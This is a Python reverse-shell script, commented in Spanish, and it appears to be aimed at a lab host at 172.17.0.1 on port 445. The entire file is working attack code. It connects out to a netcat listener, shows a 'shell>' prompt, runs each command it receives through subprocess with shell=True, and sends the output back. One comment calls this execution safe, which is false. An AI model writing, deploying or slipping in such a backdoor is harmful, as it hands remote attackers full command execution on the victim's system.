import socket
import subprocess
import sys

ip = "172.17.0.1"  
puerto = 445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, puerto))
    print(f"¡Conectado exitosamente a {ip}:{puerto}!")
    
    # Enviamos un mensaje inicial a netcat
    s.sendall(b"[+] Conexion establecida. Esperando comandos...\n\n")

    # BUCLE INFINITO: Mantiene la conexión abierta para interactuar
    while True:
        # 1. Esperar el comando desde netcat
        s.sendall(b"shell> ") # Un prompt visual para saber que está listo
        comando = s.recv(1024).decode('utf-8').strip()
        
        if not comando or comando.lower() == 'exit':
            break
            
        # 2. Ejecutar el comando en el sistema operativo de forma segura
        try:
            # Ejecuta el comando y captura la salida (stdout) y los errores (stderr)
            salida = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            # Si el comando falla (ej. escribes mal 'whoami'), captura el error
            salida = e.output
        except Exception as e:
            salida = f"Error al ejecutar: {str(e)}".encode('utf-8')

        # 3. Enviar el resultado de vuelta a netcat
        if not salida:
            salida = b"\n" # Evita que se quede vacío si el comando no genera texto
        s.sendall(salida + b"\n")

except Exception as e:
    print(f"Error de conexión: {e}")

finally:
    print("Cerrando socket.")
    s.close()
